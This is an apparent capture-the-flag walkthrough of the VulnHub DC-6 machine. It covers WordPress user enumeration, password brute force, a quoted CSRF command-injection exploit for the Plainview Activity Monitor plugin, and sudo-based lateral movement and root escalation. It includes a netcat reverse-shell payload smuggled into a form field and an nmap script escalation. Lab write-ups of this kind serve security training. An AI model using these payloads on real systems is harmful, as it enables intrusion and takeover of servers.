DC-6

[+] Wordpress User Enumeration

[+] Wordpress Brute Force

[+] Activity Monitor  Wordpress Exporit (CSRF - Reverse Shell)

[+] Privilege Escalation/Lateral Movement by abusing SUDO rights


Discovery Phase

Nmap Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.103
Host is up (0.00056s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
MAC Address: 08:00:27:AF:04:55 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


After changing the hosts file in kali we are able to access the web application

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kal1
192.168.56.103	wordy

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Wordpress Login
![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/DC-6/DC6-p1.png)
Wordpress Login

The applicate is based on WordPress
Enumerating users in WordpPress with WPScan

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# wpscan --url http://wordy --enumerate u
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.4.3
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://wordy/
[+] Started: Fri Oct  4 09:44:19 2019

Interesting Finding(s):

[+] http://wordy/
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 5.1.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating Users
 Brute Forcing Author IDs - Time: 00:00:00 <==========================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Detected By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jens
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Finished: Fri Oct  4 09:44:21 2019
[+] Requests Done: 53
[+] Cached Requests: 5
[+] Data Sent: 10.161 KB
[+] Data Received: 848.752 KB
[+] Memory used: 968 KB
[+] Elapsed time: 00:00:01

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



users :  admin,jens, graham,mark, sarah

Bruteforcing users with WPScan
The author left a clue


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
root@setrus:~# wpscan --url http://wordy --passwords passwords.txt -U mark
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.4.3
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://wordy/
[+] Started: Fri Oct  4 10:07:12 2019

Interesting Finding(s):

[+] http://wordy/
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://wordy/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://wordy/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 5.1.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68

[+] WordPress theme in use: twentyseventeen
 | Location: http://wordy/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 2.1 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'

[+] Enumerating All Plugins

[i] No plugins Found.

[+] Enumerating Config Backups
 Checking Config Backups - Time: 00:00:00 <===> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
Trying mark / kennethornick01 Time: 00:00:03 <> (233 / 2668)  8.73%  ETA: 00:00:Trying mark / took013wolf471 Time: 00:00:06 <> (515 / 2668) 19.30%  ETA: 00:00:2Trying mark / took010teet950 Time: 00:00:06 <> (519 / 2668) 19.45%  ETA: 00:00:2Trying mark / tirak017377555 Time: 00:00:06 <> (540 / 2668) 20.23%  ETA: 00:00:2Trying mark / sold747milk012 Time: 00:00:08 <> (650 / 2668) 24.36%  ETA: 00:00:2Trying mark / rawnak01720039920 Time: 00:00:10 <> (795 / 2668) 29.79%  ETA: 00:0Trying mark / patrick01041971 Time: 00:00:11 <> (899 / 2668) 33.69%  ETA: 00:00:Trying mark / patick01041971 Time: 00:00:11 <> (900 / 2668) 33.73%  ETA: 00:00:2Trying mark / pacak0165192312 Time: 00:00:11 <> (915 / 2668) 34.29%  ETA: 00:00:Trying mark / mividaeselrock0114 Time: 00:00:14 <> (1135 / 2668) 42.54%  ETA: 00Trying mark / milk010360776 Time: 00:00:14 <> (1150 / 2668) 43.10%  ETA: 00:00:2Trying mark / melek0142536-+ Time: 00:00:15 <> (1170 / 2668) 43.85%  ETA: 00:00:Trying mark / llanosrick0115 Time: 00:00:16 <> (1275 / 2668) 47.78%  ETA: 00:00:Trying mark / linkinpark0147 Time: 00:00:16 <> (1295 / 2668) 48.53%  ETA: 00:00:Trying mark / ladynighthawk01 Time: 00:00:17 <> (1325 / 2668) 49.66%  ETA: 00:00Trying mark / k0123456789kj Time: 00:00:20 <> (1565 / 2668) 58.65%  ETA: 00:00:1Trying mark / jack01jake2007 Time: 00:00:22 <> (1775 / 2668) 66.52%  ETA: 00:00:Trying mark / huh917rink014 Time: 00:00:23 <> (1840 / 2668) 68.96%  ETA: 00:00:1[SUCCESS] - mark / helpdesk01                                                   
Trying mark / henrik01 Time: 00:00:23 <===> (1875 / 1875) 100.00% Time: 00:00:23

[i] Valid Combinations Found:
 | Username: mark, Password: helpdesk01

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


username  : mark
password : hepdesk01

We have access to wordpress as mark
Looking at activity monitory and searching for a exploit.
![Alt Tag] (https://raw.githubusercontent.com/setrus/VulnHub/master/DC-6/DC6-p2.png)
Activity Monitor

Searching for expoit for Activity Monitor

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# searchsploit activity monitor
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
Activity Monitor 2002 2.6 - Remote Den | exploits/windows/dos/22690.c
RedHat Linux 6.0/6.1/6.2 - 'pam_consol | exploits/linux/local/19900.c
WordPress Plugin Plainview Activity Mo | exploits/php/webapps/45274.html
--------------------------------------- ----------------------------------------
Shellcodes: No Result
root@setrus:~# searchsploit -m 45274
  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection
      URL: https://www.exploit-db.com/exploits/45274/
     Path: /usr/share/exploitdb/exploits/php/webapps/45274.html
File Type: HTML document, ASCII text, with CRLF line terminators

Copied to: /root/45274.html


root@setrus:~# cat 45274.html 
<!--
About:
===========
Component: Plainview Activity Monitor (Wordpress plugin)
Vulnerable version: 20161228 and possibly prior
Fixed version: 20180826
CVE-ID: CVE-2018-15877
CWE-ID: CWE-78
Author:
- LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre)

Timeline:
===========
- 2018/08/25: Vulnerability found
- 2018/08/25: CVE-ID request
- 2018/08/26: Reported to developer
- 2018/08/26: Fixed version
- 2018/08/26: Advisory published on GitHub
- 2018/08/26: Advisory sent to bugtraq mailing list

Description:
===========
Plainview Activity Monitor Wordpress plugin is vulnerable to OS
command injection which allows an attacker to remotely execute
commands on underlying system. Application passes unsafe user supplied
data to ip parameter into activities_overview.php.
Privileges are required in order to exploit this vulnerability, but
this plugin version is also vulnerable to CSRF attack and Reflected
XSS. Combined, these three vulnerabilities can lead to Remote Command
Execution just with an admin click on a malicious link.

References:
===========
https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/

PoC:
-->

<html>
  <!--  Wordpress Plainview Activity Monitor RCE
        [+] Version: 20161228 and possibly prior
        [+] Description: Combine OS Commanding and CSRF to get reverse shell
        [+] Author: LydA(c)ric LEFEBVRE
        [+] CVE-ID: CVE-2018-15877
        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
  -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Creating a html file in attacker machine and adding it in /var/www/html

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:/var/www/html# cat csrf_wordpress.html 
<html>
  <!--  Wordpress Plainview Activity Monitor RCE
        [+] Version: 20161228 and possibly prior
        [+] Description: Combine OS Commanding and CSRF to get reverse shell
        [+] Author: LydA(c)ric LEFEBVRE
        [+] CVE-ID: CVE-2018-15877
        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
  -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc 192.168.56.102 1234 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![Alt Tag] (https://raw.githubusercontent.com/setrus/VulnHub/master/DC-6/DC6-p3.png)



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 57688
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Lateral movement as user Graham  :

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
www-data@dc-6:/home/mark/stuff$ ls
ls
things-to-do.txt
www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt
cat things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
www-data@dc-6:/home/mark/stuff$ su graham
su graham
Password: GSo7isUM1D4

graham@dc-6:/home/mark/stuff$ id
id
uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Getting user jens
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
graham@dc-6:~$ sudo -l
sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


We are adding /bin/bash to the end of the ./backups.sh 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
graham@dc-6:/home/jens$ cat backups.sh
cat backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
/bin/bash
graham@dc-6:/home/jens$ sudo -u jens ./backups.sh
sudo -u jens ./backups.sh
tar: Removing leading `/' from member names
jens@dc-6:~$ id;whoami
id;whoami
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)
jens
jens@dc-6:~$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Nmap privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jens@dc-6:~$ echo "os.execute('/bin/sh')" > PrivEsc.nse
echo "os.execute('/bin/sh')" > PrivEsc.nse
jens@dc-6:~$ sudo /usr/bin/nmap --script=PrivEsc.nse
sudo /usr/bin/nmap --script=PrivEsc.nse

Starting Nmap 7.40 ( https://nmap.org ) at 2019-10-09 00:10 AEST
# id
uid=0(root) gid=0(root) groups=0(root)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~








